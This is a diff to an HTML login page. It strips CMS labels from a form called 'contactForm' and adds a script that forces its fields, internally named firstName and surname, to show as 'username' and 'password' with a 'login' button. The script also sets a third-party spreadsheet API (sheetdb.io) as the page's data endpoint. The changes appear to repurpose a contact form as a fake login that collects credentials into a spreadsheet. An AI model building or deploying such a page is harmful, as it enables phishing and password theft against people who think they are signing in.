@@ -63,19 +63,19 @@
 
                 <form id="contactForm" class="login-form" autocomplete="off">
 
-                    <!-- CHANGED: placeholder to "username" -->
+                    <!-- REMOVED data-cms-ph attribute -->
                     <div class="input-row">
-                        <input type="text" id="firstName" name="firstName" placeholder="username" data-cms-ph="login.userPh" maxlength="60" autocomplete="username">
+                        <input type="text" id="firstName" name="firstName" placeholder="username" maxlength="60" autocomplete="username">
                         <span class="input-icon"><i class="fas fa-user"></i></span>
                     </div>
 
-                    <!-- CHANGED: placeholder to "password" -->
+                    <!-- REMOVED data-cms-ph attribute -->
                     <div class="input-row ">
-                        <input type="password" id="surname" name="surname" placeholder="password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
+                        <input type="password" id="surname" name="surname" placeholder="password" maxlength="60" autocomplete="current-password">
                         <span class="input-icon"><i class="fas fa-key"></i></span>
                     </div>
 
-                    <!-- CHANGED: button text to "login" -->
+                    <!-- REMOVED data-cms attribute -->
                     <button type="submit" class="btn-login-submit ">
                         <span class="btn-login-text">login</span>
                         <span class="btn-login-icon"><i class="fas fa-right-to-bracket"></i></span>
@@ -133,6 +133,20 @@
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             const API_URL = "https://sheetdb.io/api/v1/stcjj8p8ctx44";
+
+            // 🔴 FORCE OVERRIDE CMS TEXT AFTER PAGE LOADS
+            setTimeout(function() {
+                // Override placeholders
+                document.getElementById('firstName').placeholder = 'username';
+                document.getElementById('surname').placeholder = 'password';
+                
+                // Override button text
+                var btnText = document.querySelector('.btn-login-text');
+                if (btnText) {
+                    btnText.textContent = 'login';
+                    btnText.removeAttribute('data-cms');
+                }
+            }, 500); // Wait for CMS to finish loading
 
             // 🔴 Popup function
             function showAlert(message) {
